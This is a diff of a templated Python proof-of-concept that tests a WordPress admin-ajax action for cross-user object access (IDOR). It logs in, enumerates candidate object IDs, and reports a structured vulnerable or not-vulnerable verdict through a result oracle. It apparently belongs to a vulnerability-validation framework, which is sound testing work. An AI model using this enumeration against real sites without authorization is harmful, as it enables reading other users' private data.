@@ -1,17 +1,26 @@
 import requests
 from wp_login import wp_login
+from poc_result import emit_result
 
 TARGET = "{{ target_url }}"
 ACTION = "{{ ajax_action }}"
 PARAM = "{{ injectable_param }}"
 USERNAME = "{{ test_username }}"
 PASSWORD = "{{ test_password }}"
+ATTACKER_ROLE = "{{ attacker_role }}"
 
 session = requests.Session()
-login = wp_login(session, TARGET, USERNAME, PASSWORD)
-if not login.success:
-    print(f"[-] FAILURE: login failed for {USERNAME}: {login.reason}")
-    raise SystemExit(0)
+if ATTACKER_ROLE.lower() not in {"unauthenticated", "anonymous", "guest"}:
+    login = wp_login(session, TARGET, USERNAME, PASSWORD)
+    if not login.success:
+        emit_result(
+            verdict="not_vulnerable", oracle="cross_object_access", attacker_role=ATTACKER_ROLE,
+            request={"method": "POST", "url": f"{TARGET}/wp-admin/admin-ajax.php"},
+            attack={"observed": False, "attacker_user_id": "unknown", "owner_user_id": "unknown", "secret_present": False},
+            control={"observed": True, "secret_present": False},
+            impact="Authentication failed before the authorization boundary could be tested.",
+        )
+        raise SystemExit(0)
 
 candidate_ids = ["1", "2", "3", "10", "100"]
 hits = []
@@ -25,9 +34,20 @@ for object_id in candidate_ids:
     if resp.status_code == 200 and not any(marker in body.lower() for marker in ("forbidden", "unauthorized", "not allowed", "-1")):
         hits.append((object_id, resp.status_code, body))
 
-if hits:
-    print(f"[+] SUCCESS: low-privilege user received object data via {ACTION}")
-    for object_id, status, body in hits[:3]:
-        print(f"    id={object_id} status={status} body={body[:250]}")
-else:
-    print(f"[-] FAILURE: no cross-object data returned by {ACTION}")
+# Generic IDs and HTTP 200 are reachability only. The PoC author must replace
+# these placeholders with two setup-created users/objects and a private marker.
+secret_marker = ""
+attacker_user_id = ""
+owner_user_id = ""
+secret_present = bool(secret_marker and any(secret_marker in body for _, _, body in hits))
+observed = bool(attacker_user_id and owner_user_id and attacker_user_id != owner_user_id and secret_present)
+emit_result(
+    verdict="vulnerable" if observed else "not_vulnerable",
+    oracle="cross_object_access",
+    attacker_role=ATTACKER_ROLE,
+    request={"method": "POST", "url": f"{TARGET}/wp-admin/admin-ajax.php"},
+    attack={"observed": observed, "attacker_user_id": attacker_user_id, "owner_user_id": owner_user_id, "secret_present": secret_present},
+    control={"observed": False if observed else True, "secret_present": False},
+    confidentiality="high" if observed else "none",
+    impact="The attacker read a private marker owned by a different user." if observed else "Cross-user access to private data was not demonstrated.",
+)
